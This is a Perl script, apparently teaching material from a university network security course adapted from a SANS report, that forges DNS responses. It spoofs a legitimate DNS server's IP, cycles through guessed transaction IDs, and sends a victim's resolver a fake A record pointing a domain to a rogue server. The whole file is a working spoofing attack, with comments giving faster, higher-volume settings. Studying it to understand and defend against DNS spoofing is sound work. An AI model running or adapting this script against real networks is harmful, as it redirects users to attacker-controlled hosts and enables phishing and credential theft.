#!/usr/bin/perl -w

##  dns_spoofing_attack.pl

##  This script is a slightly modified version of the script 
##  taken from the SANS report on DNS spoofing attack.
##  Modifications made by Avi Kak (March 27, 2011)


#import Perl modules for packet crafting
use Net::DNS;
use Net::RawIP;
use strict;

#declare variables
#range of DNS transaction IDs to be used (decimal):
my $first_dns_id=20;
my $last_dns_id=22;

#IP address of the legitimate DNS server
my $sourceIP='192.168.1.105';

#IP address of the victim
my $destIP='192.168.1.100';

#UDP port used by the victim’s DNS resolver
my $destUDP=1026;

#Source port to be used for this DNS response. (It should ideally
#by 53.  But, for debugging, I am going to use 5353 since I have my
#bind9 running on port 53.)
my $sourcePort = 5353;

#Domain name of the server the victim wishes to connect to
my $domain_name="moonshine.ecn.purdue.edu";
#IP address of the rouge server hosting our alternative website
my $rougeIP='192.168.1.101';

#define the speed at which packets are sent:
#my $interval = 0.001;
my $interval = 5;
my $quantity = 1;

#number of times to send each DNS response
#$repeat=10000;
my $repeat=2;
#place to temporarily store packets
my @packet_array;

#temporary counter
my $counter = 0;

my $udp_packet;

while($first_dns_id < $last_dns_id) {
    #Generate the DNS question section - should match original query
    my $dns_packet = Net::DNS::Packet->new($domain_name, "A", "IN");
  
    #This is a DNS response
    $dns_packet->header->qr(1);

    #Specify DNS transaction ID
    $dns_packet->header->id($first_dns_id+1);
  
    #Add a DNS resource record for the spoofed response (TTL=1 day)
    $dns_packet->push("pre", rr_add($domain_name . ". 86400 A " . $rougeIP));

    #Save the DNS packet as raw data to be encapsulated
    my $dns_data = $dns_packet->data;

    #Generate an IP packet specifying the victim IP address and UDP port
    $udp_packet = new Net::RawIP({ip=> {saddr=>$sourceIP, daddr=>$destIP},
                                 udp=>{source=>$sourcePort, dest=>$destUDP}});

    #Encapsulate the dns packet in the udp packet
    $udp_packet->set({udp=>{data=>$dns_data}});

    #Temporarily store the udp packet
    #@packet_array[$counter]=($udp_packet);
    $packet_array[$counter]=($udp_packet);

    #increment counters before resuming loop
    $counter++;
    $first_dns_id++;
}

print "Packet array: ", @packet_array, "\n";

#Send out each DNS response as many times as specified by $repeat
my $num_packets = $counter;

while( $repeat > 0) {
    $counter = $num_packets;
    while($counter>0) {
        $counter--;

        #$udp_packet=@packet_array[$counter];
        $udp_packet = $packet_array[$counter];

        print "sending out DNS response as an A response with interval set to $interval and quantity set to $quantity:\n";
        $udp_packet->send($interval,$quantity);
    }
    $repeat--;
}
